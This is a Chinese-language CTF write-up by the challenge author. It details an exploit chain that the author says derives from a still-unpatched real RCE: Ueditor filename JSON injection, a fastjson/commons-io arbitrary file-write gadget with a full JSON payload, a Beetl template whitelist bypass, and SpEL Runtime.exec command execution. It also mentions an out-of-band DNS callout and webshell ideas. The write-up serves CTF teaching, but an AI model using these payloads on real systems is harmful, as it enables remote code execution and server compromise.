# archived elephant writeup

### TL;DR

题目改编自去年挖到的一个前台`RCE`，洞还没修。由于最新版本的利用过程太过`ctf`了所以理所当然被制作成了一个`ctf`题。

拟投稿于今年的`venom`招新赛。

### 考点

1. 代码审计
2. `Ueditor`存在`JSON`注入隐患
3. `fastjson<1.2.68 common-io`任意文件写
4. `beetl`模板白名单绕过

### 题解

#### 分析

题目只有登录，文件上传功能。

其中`IndexController`处理登录逻辑，不存在注入问题。

`UploadController`要求登陆用户为`admin`才能上传，弱口令`admin/admin`即可登录。

```java
public String upload(HttpServletRequest request, Model model, HttpSession session, @RequestParam(value = "action",required = false) String action) throws URISyntaxException {
    String user=(String) session.getAttribute("user");
    if(!"admin".equals(user)){
        model.addAttribute("message","no way");
        return "upload";
    }
    if(action == null){
        model.addAttribute("message","传个文件吧");
        return "upload";
    }
    String json = new ActionEnter(request, UploadController.class.getResource("/").toURI().getPath()+rootPath).exec();
    String contextPath = request.getContextPath();
    // 文件处理
    String handlerOut = uploadService.uploadHandle(action, json, contextPath);
    model.addAttribute("message",handlerOut);
    return "upload";
}
```

其实真正处理文件上传逻辑在`new ActionEnter(request, UploadController.class.getResource("/").toURI().getPath()+rootPath).exec();`，即调用了`ueditor`提供的函数来实现文件上传，而`UploadServiceImpl#uploadFileHandler`方法仅仅是多加了一个返回字段，这里为了降难度已经删掉了大量逻辑。

我猜有些师傅看到文件上传就会想到上传`btl`来覆盖`test.btl`等模板来打模板注入`RCE`，但`ueditor`的文件上传逻辑限制的比较死。一方面是通过`config.json`来限制了文件后缀，不能上传`btl`；另一方面也没法目录穿越。

所以很快就能发现`UploadServiceImpl#uploadFileHandler`方法十分可疑。这里通过`parseObject`处理`outJsonString`字符串，再看一眼`fj`的依赖不是最新的，很明显`sink`点就在这里。

```java
    protected String uploadFileHandler(String outJsonString, String contextPath) {
        State state = null;

        JSONObject json = JSON.parseObject(outJsonString);
        if (!"SUCCESS".equals(json.getString("state"))) {
            return "error";
        }
        json.put("author","squirt1e");

        return state == null ? outJsonString : state.toJSONString();
    }
```

如果`outJsonString`可控就可以利用了，而`outJsonString`是`ueditor`的方法返回的字符串，需要审计`ueditor`源码

#### ueditor存在JSON注入隐患

`ueditors`已不在维护，但调用`ActionEnter#exec()`确实会存在安全隐患，因为官方给的标准用法就是`new ActionEnter(request, rootPath).exec()`，如果想修改一下返回的属性还是会用`JSON`库解析一下，此时可能导致安全问题。~~大概扫了一眼国内的`CMS`引入`ueditor`还挺多的，师父们可以看看有哪些`cms`调用了`ueditor`并且进行不安全编码规范导致漏洞触发，没准能刷点`0day`。~~

![1708169914163](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1708169914163.png)

危害点在`com.baidu.ueditor.define.BaseState#toString`，主要逻辑就是对`map`进行遍历，把`key`和`value`进行处理最终制作成`JSON`字符串形式。
其中`key`和`value`用`+`进行拼接，如果`key`或`value`可控的话可能会导致`json`注入问题。

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694866213804.jpg)

`ActionEnter#invoke`方法调用了`state#toJSONString`,可以看到当`ActionMap`为`UPLOAD_FILE`（文件上传）操作时会触发 `Uploader#doExec`。

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-2.png)

先看`Uploader#doExec`的逻辑，这里会根据是否`base64`调用不同类的`save`方法。当操作为`UPLOAD_FILE`时配置类`ConfigManager`的`isBase64`为`false`，所以`Uploader#doExec`触发`BinaryUploader#save`。
```java
case ActionMap.UPLOAD_FILE:
    conf.put("isBase64", "false");
    conf.put("maxSize", this.jsonConfig.getLong("fileMaxSize"));
    conf.put("allowFiles", this.getArray("fileAllowFiles"));
    conf.put("fieldName", this.jsonConfig.getString("fileFieldName"));
    savePath = this.jsonConfig.getString("filePathFormat");
    break;
```

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-3.png)

审计`BinaryUploader#save`函数，可以看到`originFileName`是由上传表单的`filename`控制的，值得注意的一点是程序（仅仅）校验了后缀名，这很好绕过。令`filename`为`filename=flag","vulnerable":"hacked","a":".txt`即可绕过检测。最终把`originFileName`放进`BaseState`。

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-4.png)

接着触发`toJSONString`通过拼接把恶意字符处理为字符串。

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694868670291.png)


发现以上函数调用可以通过`/ueditor`路由触发，其中返回的`json`为恶意字符串，最终把`json`传给了`uploadService#uploadHandle`。因此我们可以看看`uplodaHandle`方法干了啥，使得一个`JSON`注入隐患最终造成远程命令执行。

![image-20240217194225885](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240217194225885.png)

#### fastjson common-io任意文件写

题目逻辑我都删减的差不多了，`uploadHandle`通过`parseObject`方法对恶意字符串进行解析，可以看到`json`已经被污染了。

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-5.png)

很明显`parseObject`有问题，本题用到的`fastjson`为`1.2.66`，版本不高因此存在利用的可能。观察`pom.xml`发现存在`commons-io 2.7`（多提一嘴`ueditor.jar`本身就引入了`common-io`）。不难想到`fastjson1.2.68`结合`common-io2.x`可以打一个任意文件写入，构造原理可以参考`su18`师傅发的博客。值得注意的一点是`json`的第一个属性`"state":"SUCCESS`"是不可控的，可能不太了解`fastjson`利用的师傅看到这里就绝望了，因为网上的`payload`都是`@Type`作为第一个属性开头的呀。其实这里一个小`trick`令`filename`为`flag",{"@type":"java.net.Inet4Address","val":"bgb5eh.ceye.io"},"a":".txt`即可正常恢复`Java Bean`。

```json
{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.apache.commons.io.input.XmlStreamReader",
  "is":{
    "@type":"org.apache.commons.io.input.TeeInputStream",
    "input":{
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""aaaaaa"
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "branch":{
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer": {
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file": "/tmp/pwned",
        "encoding": "UTF-8",
        "append": false
      },
      "charset": "UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "closeBranch":true
  },
  "httpContentType":"text/xml",
  "lenient":false,
  "defaultEncoding":"UTF-8"
}
```

除了属性开头的坑之外还有好多坑，实际上`ueditor Json injection`那里大概看了没多久就审出来了，但是利用卡了我一天。。

第一点是`fj`调用构造函数存在随机性，而`WriterOutputStream`恰好有一堆很相似的构造函数，所以在构造的时候需要注意`WriterOutputStream`构造方法的第二个属性是`charset`或`charsetName`，如果属性名称错误会报`Exception in thread "main" com.alibaba.fastjson.JSONException: create instance error, null, public`。

```java
public WriterOutputStream(Writer writer, Charset charset, int bufferSize, boolean writeImmediately) {
    this(writer, charset.newDecoder().onMalformedInput(CodingErrorAction.REPLACE).onUnmappableCharacter(CodingErrorAction.REPLACE).replaceWith("?"), bufferSize, writeImmediately);
}

public WriterOutputStream(Writer writer, String charsetName, int bufferSize, boolean writeImmediately) {
    this(writer, Charset.forName(charsetName), bufferSize, writeImmediately);
}
```

第二点是该方法（应该）仅支持绝对路径文件写入，`MiscCodec`中限制了相对路径写入。不过题目应该会给`docker`所以选手到时候看`docker`里的模板路径就可以了。如果难度不够的话绝对路径这部分可以当个考点。

```java
else if (clazz != InetAddress.class && clazz != Inet4Address.class && clazz != Inet6Address.class) {
	if (clazz == File.class) {
    	if (strVal.indexOf("..") >= 0 && !FILE_RELATIVE_PATH_SUPPORT) {
        	throw new JSONException("file relative path not support.");
    } else {
        return new File(strVal);
    }
```

第三点是写不进去双引号`"`，分号`;`之类的字符。这部分不是任意文件写这条`gadget`的问题，而是因为`ueditor`这里的`JSON`注入是个`http`请求头中的`filename`注入，所以写一些奇怪字符会导致`http`请求出现一些问题。结合`beetl`语法用`parameter.a`就能绕过了。后续在访问恶意模板时加个参数`?a`即可。

#### beetl模板RCE

这个国产模板实际上很好`RCE`(话说经过`RWCTF thymeleaf`那道题的洗礼后看啥模板都有自信了)，模板支持`java`方法以及属性调用。并且防护类`DefaultNativeSecurityManager`就一个黑名单，太没意思了翻翻`issue`就有`payload`，即便修了还是会有一大堆。

所以我参考`patch`写了一个看似无懈可击的白名单类:}

只允许调用`venom.elephantcms`的方法，选手只能调用我自己写的方法，而往下翻翻就找到了这个类居然有个`test`方法可以重新定义`callPattern`白名单，`callPattern`我故意没写`final`修饰。

```java
public class WhiteListNativeSecurityManager implements NativeSecurityManager {
    public static Pattern callPattern = null;
    public WhiteListNativeSecurityManager(){
        allow(Arrays.asList("venom.elephantcms"));
    }

    @Override
    public boolean permit(Object resourceId, Class c, Object target, String method) {
        if (c.isArray()) {
//            WhiteListNativeSecurityManager.class.getClassLoader()
            // 允许调用，但实际上会在在其后调用中报错。不归此处管理
            return true;
        }
//        Runtime.getRuntime()
        String name = c.getName();
        String className = null;
        String pkgName = null;
        int i = name.lastIndexOf('.');
        if (i == -1) {
            // 无包名，肯定安全，允许调用
            return true;

        }

        return  callPattern.matcher(name).matches();

    }
    public static String test(String test){
        allow(Arrays.asList(test.split(",")));
        return "ok";
    }

    /**
     *  指定白名单，默认是java.util
     * @param calls ,调用，如 [java.util,java.io.File]
     */
    public static void allow(List<String> calls){
        StringBuilder sb = new StringBuilder();
        for(String pkg:calls){
            int c = pkg.lastIndexOf('.');
            boolean classCall = false;
            if(Character.isUpperCase(pkg.charAt(c+1))){
                classCall = true;
            }
            if(classCall){
                sb.append(pkg.replace(".","\\."));
            }else{
                sb.append(pkg.replace(".","\\.")).append("\\..*");
            }

            sb.append("|");
        }
        sb.setLength(sb.length()-1);
        callPattern = Pattern.compile(sb.toString());
    }


//    public static void main(String[] args) {
//
//        {
//            test("java.lang");
//        }
//
//    }

}

```

能自己定义白名单类的话就随便绕了。

PS：本来想纯出几个白名单类恶心下大家的，不过我觉得`ctf`还是需要和实战有些区别因此就搞了个很刻意的点。虽然这个点很简单但是也比单纯的找危险类绕黑名单有意思了

#### 总结

思路很明确：通过构造恶意的文件名打一个`JSON`注入攻击`parseObject`覆盖`/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/templates/test.btl`，第一次文件写入调用`test`方法覆盖白名单多放点包路径。

```bash
${@nese.elephantcms.common.WhiteListNativeSecurityManager.test('org.springframework,java.beans,venom.elephantcms')}
```

第二次文件写入覆盖`upload.btl`打`RCE`即可。

```bash
${@java.beans.Beans.instantiate(null,parameter.a).parseExpression(parameter.b).getValue()}

/upload?a=org.springframework.expression.spel.standard.SpelExpressionParser&b=new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('{command}').getInputStream()).next()
```

不过还有个坑点就是第二步覆盖的模板不能是`test.btl`了，可能是缓存的原因导致即便写入第二次的`payload`访问模板还是会执行第一次的`payload`。

梭之：

![1708172558206](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1708172558206.png)

删减了这么多代码还是降了不少难度，并且这里只考了`JSON`注入的一个利用，同名属性覆盖没有考。

#### flag

flag{oh_m3_ued1t0r_an3_may_be_y0u_can_f1nd_s0m3_0day}

#### 非预期

“随便打打”师傅在比赛过程中做出了这道题，用的是`fastjson mysql`任意文件读出来的`flag`，我觉得只要审出来`json`拼接就算是预期吧。另外其实任意文件写`jsp`也可以（属实是小丑了），不过由于挖的那个`day`是`jfinal`框架写的，`filter`过滤了`jsp`，不过也有办法绕过就是了。
关于`jsp`写`webshell`需要分号`;`的问题（写不了分号的原因在上面提到了），我当时是没有解决所以这里预期解是覆盖`.btl`模版。现在想想应该有方法解决，之前读`RFC`标准的时候好像看到有可以`url`编码请求头的操作。

第一次在公开比赛里出题，确实有很多欠考虑的地方。另外这种任意文件上传的利用肯定有很多解法，在这里就抛砖引玉了。